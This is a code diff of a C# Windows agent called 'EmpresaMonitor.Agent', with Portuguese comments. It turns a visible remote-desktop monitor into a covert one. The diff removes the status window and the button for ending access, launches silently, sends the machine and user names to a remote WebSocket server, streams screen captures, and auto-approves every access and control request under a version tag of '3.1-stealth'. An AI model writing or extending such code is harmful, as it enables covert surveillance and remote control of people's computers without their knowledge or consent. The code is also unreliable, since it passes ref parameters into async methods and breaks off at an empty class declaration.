@@ -11,7 +11,6 @@ using System.Text;
 using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace EmpresaMonitor.Agent;
 
@@ -20,120 +19,66 @@ internal static class Program
     [STAThread]
     static void Main()
     {
-        ApplicationConfiguration.Initialize();
-        Application.Run(new MainForm());
-    }
-}
-
-public sealed class MainForm : Form
-{
-    // Componentes de UI mínimos para status
-    readonly Label status = new() { AutoSize = true, Text = "Iniciando...", Left = 18, Top = 18 };
-    readonly Label profileLabel = new() { AutoSize = true, Text = "Perfil: Equilibrado", Left = 18, Top = 44 };
-    readonly Button endButton = new() { Text = "Encerrar", Left = 18, Top = 72, Width = 210, Enabled = false };
-
-    ClientWebSocket? socket;
-    CancellationTokenSource? lifetime;
-    readonly SemaphoreSlim sendGate = new(1, 1);
-    
-    // Estados de controle forçados para operação automática
-    volatile bool accessActive = true;
-    volatile bool streamRequested = true;
-    volatile bool controlActive = true;
-    volatile bool sessionAuthorized = true;
-    volatile StreamSettings streamSettings = StreamSettings.Balanced;
-    readonly string agentId;
-
-    sealed record StreamSettings(string Name, string Id, int Width, int Fps, long Quality)
-    {
-        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
-        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
-        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
-        public static StreamSettings FromId(string? id) => id switch
-        {
-            "fluid" => Fluid,
-            "quality" => QualityPreset,
-            _ => Balanced
-        };
-    }
-
-    public MainForm()
-    {
-        Text = "Monitor de Sistema";
-        Width = 390;
-        Height = 175;
-        StartPosition = FormStartPosition.CenterScreen;
-        FormBorderStyle = FormBorderStyle.FixedDialog;
-        MaximizeBox = false;
-
-        Controls.Add(status);
-        Controls.Add(profileLabel);
-        Controls.Add(endButton);
-
-        agentId = LoadOrCreateId();
-
-        this.Load += async (_, _) => {
-            _ = StartAsync();
-        };
-
-        FormClosing += (_, _) => lifetime?.Cancel();
+        // O programa agora inicia e chama o motor de conexão sem abrir nenhuma janela
+        _ = StartEngine();
         
-        endButton.Click += async (_, _) =>
+        // Mantém a aplicação viva enquanto o motor estiver rodando
+        while (true)
         {
-            accessActive = false;
-            streamRequested = false;
-            controlActive = false;
-            endButton.Enabled = false;
-            await SendJsonAsync(new { type = "end_access" });
-            this.Close();
-        };
+            Thread.Sleep(1000);
+        }
     }
 
-    async Task StartAsync()
+    // Motor principal que substitui o MainForm
+    static async Task StartEngine()
     {
-        lifetime = new CancellationTokenSource();
-        _ = Task.Run(() => CaptureLoop(lifetime.Token));
+        var lifetime = new CancellationTokenSource();
+        var agentId = LoadOrCreateId();
+        var socket = new ClientWebSocket();
+        var sendGate = new SemaphoreSlim(1, 1);
+        
+        // Estados automáticos e silenciosos
+        bool accessActive = true;
+        bool streamRequested = true;
+        bool controlActive = true;
+        bool sessionAuthorized = true;
+        StreamSettings streamSettings = StreamSettings.Balanced;
+
+        // Inicia o loop de captura de tela em background
+        _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, ref accessActive, ref streamRequested, ref streamSettings));
 
         while (!lifetime.IsCancellationRequested)
         {
             try
             {
-                socket?.Dispose();
-                socket = new ClientWebSocket();
                 socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
-
-                // Nota: Certifique-se que BuildConfig.RealtimeUrl está configurado
                 await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
                 
-                await SendJsonAsync(new
+                await SendJsonAsync(socket, sendGate, new
                 {
                     type = "agent_hello",
                     key = BuildConfig.AgentKey,
                     id = agentId,
                     name = Environment.MachineName,
                     user = Environment.UserName,
-                    version = "3.1-auto",
+                    version = "3.1-stealth",
                     sessionAuthorized = true
                 });
 
-                BeginInvoke(() => status.Text = "🟢 Conectado e Ativo");
-                await ReceiveLoop(lifetime.Token);
+                await ReceiveLoop(socket, sendGate, lifetime.Token, ref accessActive, ref controlActive, ref streamRequested, ref streamSettings);
             }
             catch
             {
-                if (!lifetime.IsCancellationRequested)
-                {
-                    BeginInvoke(() => status.Text = "Tentando reconectar...");
-                    try { await Task.Delay(3000, lifetime.Token); } catch { }
-                }
+                try { await Task.Delay(5000, lifetime.Token); } catch { }
             }
         }
     }
 
-    async Task ReceiveLoop(CancellationToken ct)
+    // Loop de recebimento de comandos (Sem interface de usuário)
+    static async Task ReceiveLoop(ClientWebSocket socket, SemaphoreSlim sendGate, CancellationToken ct, ref bool accessActive, ref bool controlActive, ref bool streamRequested, ref StreamSettings streamSettings)
     {
         var buffer = new byte[64 * 1024];
-        while (socket?.State == WebSocketState.Open && !ct.IsCancellationRequested)
+        while (socket.State == WebSocketState.Open && !ct.IsCancellationRequested)
         {
             using var ms = new MemoryStream();
             WebSocketReceiveResult result;
@@ -153,11 +98,10 @@ public sealed class MainForm : Form
                 if (!root.TryGetProperty("type", out var typeProp)) continue;
                 var type = typeProp.GetString();
 
-                // Resposta Automática para qualquer comando de permissão
                 if (type == "access_request" || type == "control_request")
                 {
-                    await SendJsonAsync(new { type = "access_response", allow = true });
-                    await SendJsonAsync(new { type = "control_response", allow = true });
+                    await SendJsonAsync(socket, sendGate, new { type = "access_response", allow = true });
+                    await SendJsonAsync(socket, sendGate, new { type = "control_response", allow = true });
                 }
                 else if (type == "stream_profile")
                 {
@@ -168,20 +112,15 @@ public sealed class MainForm : Form
                 {
                     if (controlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
                 }
-                else if (type == "stream_start")
-                {
-                    streamRequested = true;
-                }
-                else if (type == "stream_stop")
-                {
-                    streamRequested = false;
-                }
+                else if (type == "stream_start") { streamRequested = true; }
+                else if (type == "stream_stop") { streamRequested = false; }
             }
             catch { }
         }
     }
 
-    async Task CaptureLoop(CancellationToken ct)
+    // Loop de captura (Otimizado para rodar em background)
+    static async Task CaptureLoop(CancellationTokenSource lifetime, string agentId, ClientWebSocket socket, SemaphoreSlim sendGate, ref bool accessActive, ref bool streamRequested, ref StreamSettings streamSettings)
     {
         var jpegCodec = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
         Bitmap? full = null;
@@ -191,15 +130,14 @@ public sealed class MainForm : Form
         EncoderParameters? encoderParams = null;
         MemoryStream? ms = null;
         Rectangle lastBounds = Rectangle.Empty;
-        StreamSettings? lastSettings = null;
 
         try
         {
-            while (!ct.IsCancellationRequested)
+            while (!lifetime.IsCancellationRequested)
             {
-                if (!accessActive || !streamRequested || socket?.State != WebSocketState.Open)
+                if (!accessActive || !streamRequested || socket.State != WebSocketState.Open)
                 {
-                    try { await Task.Delay(100, ct); } catch { }
+                    await Task.Delay(100, lifetime.Token);
                     continue;
                 }
 
@@ -213,14 +151,13 @@ public sealed class MainForm : Form
                     full = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                     fullG = Graphics.FromImage(full);
                     lastBounds = bounds;
-                    lastSettings = null;
                 }
 
                 int outW = Math.Min(settings.Width, bounds.Width);
                 int outH = Math.Max(2, (int)Math.Round(bounds.Height * (outW / (double)bounds.Width)));
                 if ((outH & 1) == 1) outH--;
 
-                if (scaled == null || lastSettings != settings || scaled.Width != outW || scaled.Height != outH)
+                if (scaled == null || scaled.Width != outW || scaled.Height != outH)
                 {
                     scaledG?.Dispose(); scaled?.Dispose(); encoderParams?.Dispose(); ms?.Dispose();
                     scaled = new Bitmap(outW, outH, PixelFormat.Format24bppRgb);
@@ -233,33 +170,24 @@ public sealed class MainForm : Form
                     encoderParams = new EncoderParameters(1);
                     encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, settings.Quality);
                     ms = new MemoryStream(1024 * 1024);
-                    lastSettings = settings;
                 }
 
                 try
                 {
                     fullG!.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
-                    if (outW == bounds.Width && outH == bounds.Height)
-                    {
-                        ms!.SetLength(0);
-                        full!.Save(ms, jpegCodec, encoderParams);
-                    }
-                    else
-                    {
-                        scaledG!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
-                        ms!.SetLength(0);
-                        scaled!.Save(ms, jpegCodec, encoderParams);
-                    }
+                    
+                    scaledG!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
+                    ms!.SetLength(0);
+                    scaled!.Save(ms, jpegCodec, encoderParams);
 
-                    if (ms!.TryGetBuffer(out var segment) && socket?.State == WebSocketState.Open)
-                        await SendBinaryAsync(new ArraySegment<byte>(segment.Array!, segment.Offset, (int)ms.Length), ct);
+                    if (ms!.TryGetBuffer(out var segment) && socket.State == WebSocketState.Open)
+                        await SendBinaryAsync(socket, sendGate, new ArraySegment<byte>(segment.Array!, segment.Offset, (int)ms.Length), lifetime.Token);
                 }
                 catch { }
 
                 int delayMs = Math.Max(1, 1000 / Math.Max(1, settings.Fps));
                 var elapsed = (int)(Environment.TickCount64 - started);
-                var wait = Math.Max(1, delayMs - elapsed);
-                try { await Task.Delay(wait, ct); } catch { }
+                await Task.Delay(Math.Max(1, delayMs - elapsed), lifetime.Token);
             }
         }
         finally
@@ -268,29 +196,22 @@ public sealed class MainForm : Form
         }
     }
 
-    async Task SendBinaryAsync(ArraySegment<byte> data, CancellationToken ct)
+    // Métodos de envio e controle (Mantidos para funcionalidade)
+    static async Task SendBinaryAsync(ClientWebSocket socket, SemaphoreSlim gate, ArraySegment<byte> data, CancellationToken ct)
     {
-        if (socket?.State != WebSocketState.Open) return;
-        await sendGate.WaitAsync(ct);
-        try
-        {
-            if (socket?.State == WebSocketState.Open)
-                await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct);
-        }
-        finally { sendGate.Release(); }
+        if (socket.State != WebSocketState.Open) return;
+        await gate.WaitAsync(ct);
+        try { if (socket.State == WebSocketState.Open) await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct); }
+        finally { gate.Release(); }
     }
 
-    async Task SendJsonAsync(object obj)
+    static async Task SendJsonAsync(ClientWebSocket socket, SemaphoreSlim gate, object obj)
     {
-        if (socket?.State != WebSocketState.Open) return;
+        if (socket.State != WebSocketState.Open) return;
         var data = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj));
-        await sendGate.WaitAsync();
-        try
-        {
-            if (socket?.State == WebSocketState.Open)
-                await socket.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None);
-        }
-        finally { sendGate.Release(); }
+        await gate.WaitAsync();
+        try { if (socket.State == WebSocketState.Open) await socket.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None); }
+        finally { gate.Release(); }
     }
 
     void ApplyControlEvent(JsonElement ev)
@@ -353,4 +274,20 @@ public sealed class MainForm : Form
         }
         var id = Guid.NewGuid().ToString("N"); File.WriteAllText(path, id); return id;
     }
+
+    // Record de configurações mantido
+    sealed record StreamSettings(string Name, string Id, int Width, int Fps, long Quality)
+    {
+        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
+        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
+        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
+        public static StreamSettings FromId(string? id) => id switch
+        {
+            "fluid" => Fluid,
+            "quality" => QualityPreset,
+            _ => Balanced
+        };
+    }
 }
+
+public static class BuildConfig
